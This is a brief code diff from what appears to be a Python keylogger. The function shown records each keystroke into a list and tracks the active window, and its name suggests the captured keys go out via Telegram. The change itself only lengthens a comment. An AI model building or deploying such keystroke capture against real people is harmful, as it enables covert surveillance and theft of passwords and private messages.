@@ -28,7 +28,7 @@ def on_press_send_telegram(Key):
     elif sys.platform == 'win32':
         window = win_windows()
 
-    keyboard.append(str(Key)) #Convert and add each key
+    keyboard.append(str(Key)) #Convert and add each key to the list
 
     try:
         if window != list_windows[-1]:
